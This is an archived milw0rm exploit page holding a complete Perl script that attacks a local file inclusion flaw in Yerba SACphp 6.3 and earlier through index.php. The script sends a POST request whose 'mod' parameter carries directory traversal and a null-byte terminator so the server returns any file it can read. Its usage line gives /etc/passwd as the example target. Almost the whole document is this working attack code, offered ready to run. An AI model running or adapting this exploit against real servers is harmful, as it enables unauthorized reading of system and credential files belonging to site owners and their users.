<html><head><title>Yerba SACphp <= 6.3 (mod) Local File Inclusion Exploit</title></head><pre>#! /usr/bin/perl
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# Yerba SACphp &lt;= 6.3 / Local File Inclusion Exploit
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# Program: Yerba SACphp
# Version: &lt;= 6.3
# File affected: index.php
# Download: http://sourceforge.net/projects/yerba/
#
#
# Found by Pepelux &lt;pepelux[at]enye-sec.org&gt;
# eNYe-Sec - www.enye-sec.org
#
# Bug:
# 37-		include(&quot;modulos/$mod/mod_nucleo.php&quot;);


use LWP::UserAgent;
use HTTP::Request::Common;

my ($host, $file) = @ARGV ;

unless($ARGV[1]){
	print &quot;\nUsage: perl $0 &lt;host&gt; &lt;file_to_edit&gt;\n&quot;;
	print &quot;\tex: perl $0 http://localhost /etc/passwd\n\n&quot;;
	exit 1;
}

$host = 'http://'.$host if ($host !~ /^http:/);
$host .= &quot;/&quot; if ($host !~ /\/\$/);

my $ua = LWP::UserAgent-&gt;new();
$ua-&gt;agent(&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1&quot;);
$ua-&gt;timeout(10);

my $request = HTTP::Request-&gt;new();
my $response;
my $url = $host.&quot;index.php&quot;;

my $req = HTTP::Request-&gt;new(POST =&gt; $host.&quot;index.php&quot;);
$req-&gt;content_type('application/x-www-form-urlencoded');
$req-&gt;content(&quot;mod=../../../../../&quot;.$file.&quot;%00&quot;);

$request = $ua-&gt;request($req);
$result = $request-&gt;content;

$result =~ s/&lt;[^&gt;]*&gt;//g;

print $result . &quot;\n&quot;;

exit;

# milw0rm.com [2008-10-06]</pre></html>